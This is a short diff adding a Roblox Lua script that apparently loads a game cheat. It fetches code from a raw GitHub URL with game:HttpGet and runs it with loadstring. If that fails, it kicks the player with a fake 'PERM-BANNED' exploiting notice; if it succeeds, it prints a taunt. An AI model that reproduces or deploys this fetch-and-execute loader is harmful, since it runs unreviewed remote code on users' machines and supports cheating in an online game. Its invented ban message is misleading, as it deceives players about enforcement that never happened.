@@ -1,0 +1,8 @@
+local a, b = pcall(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/cool5013/TBO/main/TBOscript"))();
+end);
+if not a then
+wait(1.5)
+game.Players.LocalPlayer:kick[[PERM-BANNED! Reason: ExpIoiting (Expires: Never)]]
+  else print"u luxky it worked✅"
+end;
